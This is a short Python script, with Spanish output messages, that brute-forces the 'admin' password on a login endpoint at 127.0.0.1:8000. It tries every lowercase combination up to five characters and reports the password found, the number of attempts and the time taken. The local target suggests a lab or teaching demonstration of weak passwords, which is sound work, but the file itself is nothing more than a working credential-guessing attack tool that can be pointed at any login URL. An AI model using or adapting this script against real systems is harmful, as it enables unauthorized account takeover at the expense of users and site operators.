import requests
import itertools
import string
import time

URL = "http://127.0.0.1:8000/login"
USERNAME = "admin"
alphabet = string.ascii_lowercase
max_length = 5

intentos = 0
inicio = time.time()

with requests.Session() as session:
    for length in range(1, max_length + 1):
        for guess in itertools.product(alphabet, repeat=length):
            password = "".join(guess)
            intentos += 1

            try:
                response = session.post(URL, json={
                    "username": USERNAME,
                    "password": password
                })

                if "Entraste" in response.json().get("message", ""):
                    print(f"Contraseña encontrada: {password}")
                    print(f"Intentos: {intentos}")
                    print(f"Tiempo: {time.time() - inicio:.2f} segundos")
                    exit()
            
            except Exception as e:
                print(f"Error en el intento {intentos}: {e}")
                time.sleep(1)

print(" No se encontró la contraseña")